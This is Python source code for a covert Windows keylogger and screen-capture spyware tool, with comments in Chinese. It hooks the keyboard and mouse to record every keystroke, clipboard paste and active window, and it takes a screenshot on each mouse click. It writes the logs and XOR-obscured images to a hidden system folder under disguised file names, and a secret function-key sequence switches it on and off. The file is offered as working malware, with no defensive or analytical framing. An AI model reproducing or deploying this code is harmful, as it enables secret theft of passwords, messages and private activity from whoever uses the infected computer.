# -*- coding: utf-8 -*- # 
from ctypes import *
import pythoncom
import pyHook
import win32clipboard, win32gui, win32ui, win32con, win32api
import Image, os, wmi, winsound, time, sys

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
switch = False
i=0
keys = [0, 0, 0, 0, 0]
keys_on = [114, 118, 116, 120, 117]   # F3 F7 F5 F9 F6
keys_off = [115, 116, 115, 116, 115]  # F4 F5 F4 F5 F4
key_exit = [117, 116, 117, 116, 118]  # F6 F5 F6 F5 F7
procname='TosBtsnd.exe'
filepath='C:\\Windows\\debug\\WIA\\log'

# 

def replace_char(s, idx, ch):
    import ctypes
    OFFSET = ctypes.sizeof(ctypes.c_size_t) * 5
    a = ctypes.c_char.from_address(id(s) + OFFSET)
    pi = ctypes.pointer(a)
    pi[idx] = ch
    
def Logging(logstr):
    global filepath
    f=open(filepath+'\\DS~_OM2WFQ_~~4B`]_Y3I])NQA.tpp','a')
    f.write(logstr)
    f.close()
    
def keypush(keyid):
    keys[0]=keys[1]
    keys[1]=keys[2]
    keys[2]=keys[3]
    keys[3]=keys[4]
    keys[4]=keyid

def keycheck():
    global keys,switch
    if keys==keys_on:
        switch = True
        winsound.Beep(4000,150)
        winsound.Beep(4000,150) 
        
    if keys==keys_off:
        switch = False
        winsound.Beep(4000,800)  
    
    if keys==key_exit:
        winsound.Beep(4000,150)
        sys.setrecursionlimit(4000)

def file_encrypt(filename):
    enc=[0x13, 0x01, 0xfe, 0xea, 0x3c, 0x0d, 0x48, 0x68, 0x6c, 0x2e, 0x31, 0x45, 0x11, 0x33, 0xae, 0x2e, 
         0x98, 0x71, 0xdd, 0x62, 0xaa, 0x0c, 0x0d, 0x12, 0x81, 0x12, 0x76, 0x71, 0xea, 0xae, 0xfc, 0x22,
         0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0x11, 0x33, 0x55, 0x77, 0x99, 0x22, 0x44, 0x66, 0x88, 0x12, 0x23,
         0x34, 0x45, 0x56, 0x67, 0x78, 0x89, 0x90, 0xab, 0xbc, 0xcd, 0xde, 0xef, 0xac, 0x13, 0x24, 0x35]
    
    f=open(filename,'rb')
    t=f.read()
    f.close()

    for i in range(0,20):
        replace_char(t, i, chr(ord(t[i]) ^ enc[i%len(enc)]))
        i+=1
       
    f=open(filename,'wb')
    f.write(t)
    f.close()
    
def file_decrypt(filename):
    ori=['\xff','\xd8','\xff','\xe0','\x00','\x10','\x4a','\x46','\x49','\x46','\x00','\x01','\x01','\x00','\x00','\x01']
    f=open(filename,'rb')
    t=f.read()
    f.close()
    for i in range(0,15):
        replace_char(t, i, ori[i])
    f=open(filename,'wb')
    f.write(t)
    f.close()
                    
def get_current_screen():
    global i,filepath
    hdesktop = win32gui.GetDesktopWindow()
    # 分辨率适应
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    # 创建设备描述表
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
     
    # 创建一个内存设备描述表
    mem_dc = img_dc.CreateCompatibleDC()
     
    # 创建位图对象
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
     
    # 截图至内存设备描述表
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
     
    # 将截图保存到文件中
    filename = filepath+'\\CL~_Y22CND_'+str(i)+'.bmp'
    screenshot.SaveBitmapFile(mem_dc, filename)
    Image.open(filename).save(filename[:-4]+".jpg")
    os.rename(filename[:-4]+".jpg", filename[:-4]+".tmp")
    os.remove(filename) 
    
    file_encrypt(filename[:-4]+".tmp")
    
    i+=1
  
    # 内存释放
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

def get_current_process():
 
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()
 
    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
 
    # 将进程ID存入变量中
    process_id = "%d" % pid.value
 
    # 申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)
 
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
 
    # 读取窗口标题
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
 
    # 记录
    Logging("[ PID:" + process_id + "," + executable.value +"," + windows_title.value)
    Logging("\n")
 
    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
 
# 定义击键监听事件函数
def KeyStroke(event):
    global current_window,switch
    if switch==True:
        # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
        if event.WindowName != current_window:
            current_window = event.WindowName
            # 函数调用
            get_current_process()
     
        # 检测击键是否常规按键（非组合键等）
        if event.Ascii > 32 and event.Ascii <127:
            Logging(chr(event.Ascii)),
        else:
            # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                try:
                    pasted_value = win32clipboard.GetClipboardData()
                    Logging("[PASTE]-" + (pasted_value)),
                    win32clipboard.CloseClipboard()
                except:
                    win32clipboard.CloseClipboard()
            else:
                try:
                    Logging("["+event.Key+"]" ),
                except:
                    pass
        # 循环监听下一个击键事件
    keypush(event.KeyID)    
    keycheck()
    return True

def MouseEvent(event):
    global current_window,i,switch
    if switch==True:
        if event.MessageName=='mouse left down' or event.MessageName=='mouse right down':
            Logging("\n")
            Logging(str(i)+' '+ event.MessageName + ' at ' + str(event.Position[0]) + ',' + str(event.Position[1]))
            Logging("\n")
            get_current_screen()
    return True

def procExist():
    global procname
    c = wmi.WMI()
    i = 0
    for result in c.Win32_Process(Name=procname):
       i += 1
    if i > 2:
        return True
    else:
        return False
    
if __name__ == "__main__":
    if procExist():
        pass
    else:
        if not os.path.exists(filepath):
            os.mkdir(filepath)
            os.system('attrib +h +s '+filepath)
        timedir=time.strftime("%m%d%H%M",time.localtime())
        if not os.path.exists(filepath+'\\' +timedir):
            os.mkdir(filepath + '\\' + timedir)
            os.system('attrib +h +s '+ filepath + '\\' + timedir)
        
        os.system('@echo off')    
        command = 'move '+filepath+'\\*.* ' + filepath + '\\' + timedir + '\\'
        os.system(command)
        
        # 创建并注册hook管理器
        kl = pyHook.HookManager()
        kl.KeyDown = KeyStroke

        # 注册hook并执行
        kl.HookKeyboard()
        
        kl.MouseAll = MouseEvent
        kl.HookMouse()
        
        pythoncom.PumpMessages()
        kl.UnhookKeyboard()
        kl.UnhookMouse()
        win32api.PostQuitMessage(0)
